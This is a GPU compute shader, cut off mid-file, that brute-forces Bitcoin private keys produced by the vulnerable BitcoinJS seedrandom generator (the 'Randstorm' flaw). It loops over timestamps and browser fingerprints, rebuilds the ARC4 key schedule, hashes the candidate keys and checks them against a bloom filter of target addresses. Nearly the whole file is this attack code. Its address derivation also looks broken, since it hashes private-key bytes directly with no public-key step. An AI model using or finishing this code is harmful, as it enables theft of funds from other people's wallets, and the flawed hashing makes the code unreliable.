
// ============================================================
//  Randstorm Full Shader — Fingerprint-Aware Edition
//  Реализует точную схему seedrandom.js (BitcoinJS уязвимая версия):
//
//  pool[i++] ^= screen.width & 0xFF;
//  pool[i++] ^= screen.height & 0xFF;
//  pool[i++] ^= screen.colorDepth & 0xFF;
//  pool[i++] ^= (-tz) & 0xFF;           // timezoneOffset
//  pool[i++] ^= (new Date().getTime()) & 0xFF;   // timestamp byte 0
//  ... (8 bytes total from timestamp)
//
//  Dispatch: global_id.x = timestamp_index, global_id.y = fingerprint_index
// ============================================================

// ── Bindings ────────────────────────────────────────────────
struct GpuParams {
    start_ms_lo:    u32,
    start_ms_hi:    u32,
    interval_ms:    u32,
    fp_count:       u32,
    bloom_size:     u32,
    _pad0:          u32,
    _pad1:          u32,
    _pad2:          u32,
}

struct Fingerprint {
    screen_width:     u32,
    screen_height:    u32,
    color_depth:      u32,
    timezone_offset:  i32,   // signed — может быть отрицательным
}

struct MatchResult {
    timestamp_lo: u32,
    timestamp_hi: u32,
    fp_index:     u32,
    _pad:         u32,
    address:      array<u32, 5>,   // 20 bytes hash160
}

@group(0) @binding(0) var<uniform>            params:      GpuParams;
@group(0) @binding(1) var<storage, read>      fingerprints: array<Fingerprint>;
@group(0) @binding(2) var<storage, read>      bloom:        array<u32>;
@group(0) @binding(3) var<storage, read_write> results:     array<MatchResult>;
@group(0) @binding(4) var<storage, read_write> result_count: array<atomic<u32>>;

// ── Bloom filter check ───────────────────────────────────────
fn bloom_check(h0: u32, h1: u32, h2: u32, h3: u32, h4: u32) -> bool {
    let n = params.bloom_size * 32u;
    // Guard: bloom filter not populated — let all candidates through
    if n == 0u { return true; }
    let idx0 = (h0 ^ (h1 << 7u))  % n;
    let idx1 = (h1 ^ (h2 << 11u)) % n;
    let idx2 = (h2 ^ (h3 << 13u)) % n;
    let idx3 = (h3 ^ (h4 << 17u)) % n;
    // FIX: wrap bitwise-AND operands in parens so `==` does not bind tighter than `&`
    // Bad:  (w >> shift) & 1u == 0u   →  (w >> shift) & (1u == 0u)  →  u32 & bool  → naga error
    // Good: ((w >> shift) & 1u) == 0u →  (u32) == u32               → bool         → OK
    let w0 = bloom[idx0 >> 5u]; if ((w0 >> (idx0 & 31u)) & 1u) == 0u { return false; }
    let w1 = bloom[idx1 >> 5u]; if ((w1 >> (idx1 & 31u)) & 1u) == 0u { return false; }
    let w2 = bloom[idx2 >> 5u]; if ((w2 >> (idx2 & 31u)) & 1u) == 0u { return false; }
    let w3 = bloom[idx3 >> 5u]; if ((w3 >> (idx3 & 31u)) & 1u) == 0u { return false; }
    return true;
}

// ── ARC4 KSA — с учётом fingerprint ─────────────────────────
//
//  Оригинальный seedrandom.js собирал ключ так:
//    key[0] = screen.width  & 0xFF
//    key[1] = screen.height & 0xFF
//    key[2] = color_depth   & 0xFF
//    key[3] = (-tz)         & 0xFF
//    key[4..11] = timestamp bytes (little-endian, 8 bytes)
//
//  Итого: 12 байт ключа
//
fn arc4_ksa(
    ts_lo: u32, ts_hi: u32,
    sw: u32, sh: u32, cd: u32, tz: i32,
    slot: u32,
    out_s: ptr<function, array<u32, 256>>
) {
    // Составляем ключ (12 байт) в виде 12 u32
    let k0  = sw & 0xFFu;
    let k1  = sh & 0xFFu;
    let k2  = cd & 0xFFu;
    let k3  = u32((-tz) & 0xFF);
    let k4  = ts_lo        & 0xFFu;
    let k5  = (ts_lo >> 8u)  & 0xFFu;
    let k6  = (ts_lo >> 16u) & 0xFFu;
    let k7  = (ts_lo >> 24u) & 0xFFu;
    let k8  = ts_hi        & 0xFFu;
    let k9  = (ts_hi >> 8u)  & 0xFFu;
    let k10 = (ts_hi >> 16u) & 0xFFu;
    let k11 = (ts_hi >> 24u) & 0xFFu;

    // Инициализируем S-box
    var s: array<u32, 256>;
    for (var i = 0u; i < 256u; i++) { s[i] = i; }

    // KSA
    var j = 0u;
    for (var i = 0u; i < 256u; i++) {
        let ki = select(
            select(
                select(
                    select(
                        select(
                            select(
                                select(
                                    select(
                                        select(
                                            select(
                                                select(k11, k10, i % 12u == 10u),
                                                k9, i % 12u == 9u),
                                            k8, i % 12u == 8u),
                                        k7, i % 12u == 7u),
                                    k6, i % 12u == 6u),
                                k5, i % 12u == 5u),
                            k4, i % 12u == 4u),
                        k3, i % 12u == 3u),
                    k2, i % 12u == 2u),
                k1, i % 12u == 1u),
            k0, i % 12u == 0u);
        j = (j + s[i] + ki) & 0xFFu;
        let tmp = s[i]; s[i] = s[j]; s[j] = tmp;
    }

    // Сохраняем результат
    for (var i = 0u; i < 256u; i++) { (*out_s)[i] = s[i]; }
}

// ── ARC4 PRNG — генерирует 32 байта вывода ──────────────────
fn arc4_prng(s: ptr<function, array<u32, 256>>, out: ptr<function, array<u32, 32>>) {
    var i = 0u;
    var j = 0u;
    for (var k = 0u; k < 32u; k++) {
        i = (i + 1u) & 0xFFu;
        j = (j + (*s)[i]) & 0xFFu;
        let tmp = (*s)[i]; (*s)[i] = (*s)[j]; (*s)[j] = tmp;
        (*out)[k] = (*s)[((*s)[i] + (*s)[j]) & 0xFFu];
    }
}

// ── SHA-256 (полностью развёрнутый — без динамической индексации) ──

fn rotr32(x: u32, n: u32) -> u32 { return (x >> n) | (x << (32u - n)); }
fn ch(e: u32, f: u32, g: u32)  -> u32 { return (e & f) ^ (~e & g); }
fn maj(a: u32, b: u32, c: u32) -> u32 { return (a & b) ^ (a & c) ^ (b & c); }
fn ep0(a: u32) -> u32 { return rotr32(a,2u)  ^ rotr32(a,13u) ^ rotr32(a,22u); }
fn ep1(e: u32) -> u32 { return rotr32(e,6u)  ^ rotr32(e,11u) ^ rotr32(e,25u); }
fn sig0(x: u32) -> u32 { return rotr32(x,7u) ^ rotr32(x,18u) ^ (x >> 3u); }
fn sig1(x: u32) -> u32 { return rotr32(x,17u)^ rotr32(x,19u) ^ (x >> 10u); }

fn sha256_block(
    m00: u32, m01: u32, m02: u32, m03: u32,
    m04: u32, m05: u32, m06: u32, m07: u32,
    m08: u32, m09: u32, m10: u32, m11: u32,
    m12: u32, m13: u32, m14: u32, m15: u32,
    h0i: u32, h1i: u32, h2i: u32, h3i: u32,
    h4i: u32, h5i: u32, h6i: u32, h7i: u32,
) -> array<u32, 8> {
    // Message schedule (полностью развёрнут)
    let w00=m00; let w01=m01; let w02=m02; let w03=m03;
    let w04=m04; let w05=m05; let w06=m06; let w07=m07;
    let w08=m08; let w09=m09; let w10=m10; let w11=m11;
    let w12=m12; let w13=m13; let w14=m14; let w15=m15;
    let w16=sig1(w14)+w09+sig0(w01)+w00;
    let w17=sig1(w15)+w10+sig0(w02)+w01;
    let w18=sig1(w16)+w11+sig0(w03)+w02;
    let w19=sig1(w17)+w12+sig0(w04)+w03;
    let w20=sig1(w18)+w13+sig0(w05)+w04;
    let w21=sig1(w19)+w14+sig0(w06)+w05;
    let w22=sig1(w20)+w15+sig0(w07)+w06;
    let w23=sig1(w21)+w16+sig0(w08)+w07;
    let w24=sig1(w22)+w17+sig0(w09)+w08;
    let w25=sig1(w23)+w18+sig0(w10)+w09;
    let w26=sig1(w24)+w19+sig0(w11)+w10;
    let w27=sig1(w25)+w20+sig0(w12)+w11;
    let w28=sig1(w26)+w21+sig0(w13)+w12;
    let w29=sig1(w27)+w22+sig0(w14)+w13;
    let w30=sig1(w28)+w23+sig0(w15)+w14;
    let w31=sig1(w29)+w24+sig0(w16)+w15;
    let w32=sig1(w30)+w25+sig0(w17)+w16;
    let w33=sig1(w31)+w26+sig0(w18)+w17;
    let w34=sig1(w32)+w27+sig0(w19)+w18;
    let w35=sig1(w33)+w28+sig0(w20)+w19;
    let w36=sig1(w34)+w29+sig0(w21)+w20;
    let w37=sig1(w35)+w30+sig0(w22)+w21;
    let w38=sig1(w36)+w31+sig0(w23)+w22;
    let w39=sig1(w37)+w32+sig0(w24)+w23;
    let w40=sig1(w38)+w33+sig0(w25)+w24;
    let w41=sig1(w39)+w34+sig0(w26)+w25;
    let w42=sig1(w40)+w35+sig0(w27)+w26;
    let w43=sig1(w41)+w36+sig0(w28)+w27;
    let w44=sig1(w42)+w37+sig0(w29)+w28;
    let w45=sig1(w43)+w38+sig0(w30)+w29;
    let w46=sig1(w44)+w39+sig0(w31)+w30;
    let w47=sig1(w45)+w40+sig0(w32)+w31;
    let w48=sig1(w46)+w41+sig0(w33)+w32;
    let w49=sig1(w47)+w42+sig0(w34)+w33;
    let w50=sig1(w48)+w43+sig0(w35)+w34;
    let w51=sig1(w49)+w44+sig0(w36)+w35;
    let w52=sig1(w50)+w45+sig0(w37)+w36;
    let w53=sig1(w51)+w46+sig0(w38)+w37;
    let w54=sig1(w52)+w47+sig0(w39)+w38;
    let w55=sig1(w53)+w48+sig0(w40)+w39;
    let w56=sig1(w54)+w49+sig0(w41)+w40;
    let w57=sig1(w55)+w50+sig0(w42)+w41;
    let w58=sig1(w56)+w51+sig0(w43)+w42;
    let w59=sig1(w57)+w52+sig0(w44)+w43;
    let w60=sig1(w58)+w53+sig0(w45)+w44;
    let w61=sig1(w59)+w54+sig0(w46)+w45;
    let w62=sig1(w60)+w55+sig0(w47)+w46;
    let w63=sig1(w61)+w56+sig0(w48)+w47;

    // Compression (64 rounds)
    var a=h0i; var b=h1i; var c=h2i; var d=h3i;
    var e=h4i; var f=h5i; var g=h6i; var hh=h7i;
    var t1=0u; var t2=0u;
    t1=hh+ep1(e)+ch(e,f,g)+0x428a2f98u+w00; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x71374491u+w01; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0xb5c0fbefu+w02; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0xe9b5dba5u+w03; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x3956c25bu+w04; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x59f111f1u+w05; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x923f82a4u+w06; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0xab1c5ed5u+w07; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0xd807aa98u+w08; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x12835b01u+w09; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x243185beu+w10; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x550c7dc3u+w11; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x72be5d74u+w12; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x80deb1feu+w13; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x9bdc06a7u+w14; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0xc19bf174u+w15; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0xe49b69c1u+w16; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0xefbe4786u+w17; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x0fc19dc6u+w18; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x240ca1ccu+w19; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x2de92c6fu+w20; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x4a7484aau+w21; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x5cb0a9dcu+w22; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x76f988dau+w23; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x983e5152u+w24; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0xa831c66du+w25; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0xb00327c8u+w26; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0xbf597fc7u+w27; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0xc6e00bf3u+w28; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0xd5a79147u+w29; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x06ca6351u+w30; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x14292967u+w31; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x27b70a85u+w32; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x2e1b2138u+w33; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x4d2c6dfcu+w34; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x53380d13u+w35; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x650a7354u+w36; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x766a0abbu+w37; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x81c2c92eu+w38; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x92722c85u+w39; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0xa2bfe8a1u+w40; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0xa81a664bu+w41; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0xc24b8b70u+w42; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0xc76c51a3u+w43; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0xd192e819u+w44; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0xd6990624u+w45; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0xf40e3585u+w46; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x106aa070u+w47; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x19a4c116u+w48; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x1e376c08u+w49; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x2748774cu+w50; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x34b0bcb5u+w51; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x391c0cb3u+w52; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x4ed8aa4au+w53; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x5b9cca4fu+w54; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x682e6ff3u+w55; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x748f82eeu+w56; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x78a5636fu+w57; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x84c87814u+w58; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x8cc70208u+w59; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0x90befffau+w60; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0xa4506cebu+w61; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0xbef9a3f7u+w62; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}
    t1=hh+ep1(e)+ch(e,f,g)+0xc67178f2u+w63; t2=ep0(a)+maj(a,b,c); d+=t1; hh=t1+t2; {let tmp=a;a=hh;hh=g;g=f;f=e;e=d;d=c;c=b;b=tmp;}

    var out: array<u32, 8>;
    out[0]=h0i+a; out[1]=h1i+b; out[2]=h2i+c; out[3]=h3i+d;
    out[4]=h4i+e; out[5]=h5i+f; out[6]=h6i+g; out[7]=h7i+hh;
    return out;
}

// Вычисляет SHA-256 для 32-байтового сообщения (приватный ключ)
fn sha256_32(b: array<u32, 32>) -> array<u32, 8> {
    // Первый блок: 32 байта данных + padding до 64 байт
    // Конвертируем байты в big-endian u32 (14 слов данных + 0x80000000 + 0 + length)
    let m00 = (b[ 0]<<24u)|(b[ 1]<<16u)|(b[ 2]<<8u)|b[ 3];
    let m01 = (b[ 4]<<24u)|(b[ 5]<<16u)|(b[ 6]<<8u)|b[ 7];
    let m02 = (b[ 8]<<24u)|(b[ 9]<<16u)|(b[10]<<8u)|b[11];
    let m03 = (b[12]<<24u)|(b[13]<<16u)|(b[14]<<8u)|b[15];
    let m04 = (b[16]<<24u)|(b[17]<<16u)|(b[18]<<8u)|b[19];
    let m05 = (b[20]<<24u)|(b[21]<<16u)|(b[22]<<8u)|b[23];
    let m06 = (b[24]<<24u)|(b[25]<<16u)|(b[26]<<8u)|b[27];
    let m07 = (b[28]<<24u)|(b[29]<<16u)|(b[30]<<8u)|b[31];
    let m08 = 0x80000000u;
    return sha256_block(
        m00,m01,m02,m03,m04,m05,m06,m07,
        m08,0u,0u,0u,0u,0u,0u,0x00000100u,  // length = 256 bits
        0x6a09e667u,0xbb67ae85u,0x3c6ef372u,0xa54ff53au,
        0x510e527fu,0x9b05688cu,0x1f83d9abu,0x5be0cd19u,
    );
}

// SHA-256 двойной раунд (для Bitcoin адреса)
fn sha256d_32(b: array<u32, 32>) -> array<u32, 8> {
    let h1 = sha256_32(b);
    // Второй раунд: 32 байта (h1 в big-endian) + padding
    return sha256_block(
        h1[0],h1[1],h1[2],h1[3],h1[4],h1[5],h1[6],h1[7],
        0x80000000u,0u,0u,0u,0u,0u,0u,0x00000100u,
        0x6a09e667u,0xbb67ae85u,0x3c6ef372u,0xa54ff53au,
        0x510e527fu,0x9b05688cu,0x1f83d9abu,0x5be0cd19u,
    );
}

// ── RIPEMD-160 (упрощённый, через switch для избегания array[i]) ─
fn rmd_f(j: u32, x: u32, y: u32, z: u32) -> u32 {
    if j < 16u  { return x ^ y ^ z; }
    if j < 32u  { return (x & y) | (~x & z); }
    if j < 48u  { return (x | ~y) ^ z; }
    if j < 64u  { return (x & z) | (y & ~z); }
    return x ^ (y | ~z);
}
fn rmd_k1(j: u32) -> u32 {
    if j < 16u { return 0u; }
    if j < 32u { return 0x5a827999u; }
    if j < 48u { return 0x6ed9eba1u; }
    if j < 64u { return 0x8f1bbcdcu; }
    return 0xa953fd4eu;
}
fn rmd_k2(j: u32) -> u32 {
    if j < 16u { return 0x50a28be6u; }
    if j < 32u { return 0x5c4dd124u; }
    if j < 48u { return 0x6d703ef3u; }
    if j < 64u { return 0x7a6d76e9u; }
    return 0u;
}
fn rmd_r1(j: u32) -> u32 {
    switch j {
        case  0u: { return  0u; } case  1u: { return  1u; } case  2u: { return  2u; } case  3u: { return  3u; }
        case  4u: { return  4u; } case  5u: { return  5u; } case  6u: { return  6u; } case  7u: { return  7u; }
        case  8u: { return  8u; } case  9u: { return  9u; } case 10u: { return 10u; } case 11u: { return 11u; }
        case 12u: { return 12u; } case 13u: { return 13u; } case 14u: { return 14u; } case 15u: { return 15u; }
        case 16u: { return  7u; } case 17u: { return  4u; } case 18u: { return 13u; } case 19u: { return  1u; }
        case 20u: { return 10u; } case 21u: { return  6u; } case 22u: { return 15u; } case 23u: { return  3u; }
        case 24u: { return 12u; } case 25u: { return  0u; } case 26u: { return  9u; } case 27u: { return  5u; }
        case 28u: { return  2u; } case 29u: { return 14u; } case 30u: { return 11u; } case 31u: { return  8u; }
        case 32u: { return  3u; } case 33u: { return 10u; } case 34u: { return 14u; } case 35u: { return  4u; }
        case 36u: { return  9u; } case 37u: { return 15u; } case 38u: { return  8u; } case 39u: { return  1u; }
        case 40u: { return  2u; } case 41u: { return  7u; } case 42u: { return  0u; } case 43u: { return  6u; }
        case 44u: { return 13u; } case 45u: { return 11u; } case 46u: { return  5u; } case 47u: { return 12u; }
        case 48u: { return  1u; } case 49u: { return  9u; } case 50u: { return 11u; } case 51u: { return 10u; }
        case 52u: { return  0u; } case 53u: { return  8u; } case 54u: { return 12u; } case 55u: { return  4u; }
        case 56u: { return 13u; } case 57u: { return  3u; } case 58u: { return  7u; } case 59u: { return 15u; }
        case 60u: { return 14u; } case 61u: { return  5u; } case 62u: { return  6u; } case 63u: { return  2u; }
        case 64u: { return  4u; } case 65u: { return  0u; } case 66u: { return  5u; } case 67u: { return  9u; }
        case 68u: { return  7u; } case 69u: { return 12u; } case 70u: { return  2u; } case 71u: { return 10u; }
        case 72u: { return 14u; } case 73u: { return  1u; } case 74u: { return  3u; } case 75u: { return  8u; }
        case 76u: { return 11u; } case 77u: { return  6u; } case 78u: { return 15u; } case 79u: { return 13u; }
        default:  { return  0u; }
    }
}
fn rmd_r2(j: u32) -> u32 {
    switch j {
        case  0u: { return  5u; } case  1u: { return 14u; } case  2u: { return  7u; } case  3u: { return  0u; }
        case  4u: { return  9u; } case  5u: { return  2u; } case  6u: { return 11u; } case  7u: { return  4u; }
        case  8u: { return 13u; } case  9u: { return  6u; } case 10u: { return 15u; } case 11u: { return  8u; }
        case 12u: { return  1u; } case 13u: { return 10u; } case 14u: { return  3u; } case 15u: { return 12u; }
        case 16u: { return  6u; } case 17u: { return 11u; } case 18u: { return  3u; } case 19u: { return  7u; }
